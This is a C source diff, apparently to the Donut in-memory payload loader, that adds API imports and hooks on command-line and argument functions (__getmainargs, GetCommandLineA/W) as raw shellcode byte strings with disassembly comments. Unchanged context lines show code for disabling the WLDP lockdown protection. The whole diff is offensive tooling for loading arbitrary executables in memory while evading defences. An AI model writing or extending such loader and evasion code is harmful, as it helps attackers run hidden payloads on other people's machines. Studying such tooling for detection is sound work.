@@ -51,11 +51,16 @@ static API_IMPORT api_imports[]=
   {KERNEL32_DLL, "VirtualProtect"},
   {KERNEL32_DLL, "Sleep"},
   {KERNEL32_DLL, "MultiByteToWideChar"},
+  {KERNEL32_DLL, "WideCharToMultiByte"},
   {KERNEL32_DLL, "GetUserDefaultLCID"},
   {KERNEL32_DLL, "WaitForSingleObject"},
   {KERNEL32_DLL, "CreateThread"},
   {KERNEL32_DLL, "AllocConsole"},
   {KERNEL32_DLL, "AttachConsole"},
+
+  {KERNEL32_DLL, "GetProcessHeap"},
+  {KERNEL32_DLL, "HeapAlloc"},
+  {KERNEL32_DLL, "HeapFree"},
 
   {SHELL32_DLL,  "CommandLineToArgvW"},
   
@@ -635,6 +640,7 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
       if(mod->type == DONUT_MODULE_EXE) {
         GenRandomString(mod->param, 4);
         mod->param[4] = ' ';
+        mod->param[5] = ' ';
       }
       strncat(mod->param, c->param, DONUT_MAX_NAME-6);
     }
@@ -783,10 +789,46 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     // stuff for PE loader
     strcpy(inst->dataname,       ".data");
     strcpy(inst->kernelbase,     "kernelbase");
-    strcpy(inst->msvcrt,         "msvcrt");
-    strcpy(inst->acmdln,         "_acmdln");
-    strcpy(inst->wcmdln,         "_wcmdln");
     strcpy(inst->exit,           "ExitProcess");
+
+    //strings for hooked functions
+    strcpy(inst->getmainargs,    "__getmainargs");
+    strcpy(inst->wgetmainargs,   "__wgetmainargs");
+    strcpy(inst->getcommandlinea,   "GetCommandLineA");
+    strcpy(inst->getcommandlinew,   "GetCommandLineW");
+
+    //asm code for hooked functions
+    /*
+        0:  c7 01 ff ff ff ff                   mov    DWORD PTR [rcx],0xffffffff
+        6:  48 b8 ff ff ff ff ff ff ff ff       mov    rax,0xffffffffffffffff
+        10: 48 89 02                            mov    QWORD PTR [rdx],rax
+        13: 48 31 c0                            xor    rax,rax
+        16: c3                                  ret
+    */
+    strcpy(inst->hooked_getmainargs64_asm,  "\xc7\x01\xff\xff\xff\xff\x48\xb8\xff\xff\xff\xff\xff\xff\xff\xff\x48\x89\x02\x48\x31\xc0\xc3");
+    strcpy(inst->hooked_wgetmainargs64_asm,  "\xc7\x01\xff\xff\xff\xff\x48\xb8\xff\xff\xff\xff\xff\xff\xff\xff\x48\x89\x02\x48\x31\xc0\xc3");
+    /*
+        0:  8b 4c 24 04             mov    ecx,DWORD PTR [esp+0x4]
+        4:  c7 01 ff ff ff ff       mov    DWORD PTR [ecx],0xffffffff
+        a:  8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]
+        e:  c7 01 ff ff ff ff       mov    DWORD PTR [ecx],0xffffffff
+        14: 31 c0                   xor    eax,eax
+        16: c3                      ret
+    */
+    strcpy(inst->hooked_wgetmainargs32_asm,  "\x8b\x4c\x24\x04\xc7\x01\xff\xff\xff\xff\x8b\x4c\x24\x08\xc7\x01\xff\xff\xff\xff\x31\xc0\xc3");
+    strcpy(inst->hooked_getmainargs32_asm,  "\x8b\x4c\x24\x04\xc7\x01\xff\xff\xff\xff\x8b\x4c\x24\x08\xc7\x01\xff\xff\xff\xff\x31\xc0\xc3");
+    /*
+        0:  48 b8 ff ff ff ff ff ff ff ff   mov rax,0xffffffffffffffff
+        a:  c3                              ret
+    */
+    strcpy(inst->hooked_GetCommandLineA64_asm, "\x48\xb8\xff\xff\xff\xff\xff\xff\xff\xff\xc3");
+    strcpy(inst->hooked_GetCommandLineW64_asm, "\x48\xb8\xff\xff\xff\xff\xff\xff\xff\xff\xc3");
+    /*
+        0:  b8 ff ff ff ff          mov    eax,0xffffffff
+        5:  c3                      ret
+    */
+    strcpy(inst->hooked_GetCommandLineA32_asm, "\xb8\xff\xff\xff\xff\xc3");
+    strcpy(inst->hooked_GetCommandLineW32_asm, "\xb8\xff\xff\xff\xff\xc3");
     
     // required to disable WLDP
     strcpy(inst->wldp,           "WLDP");
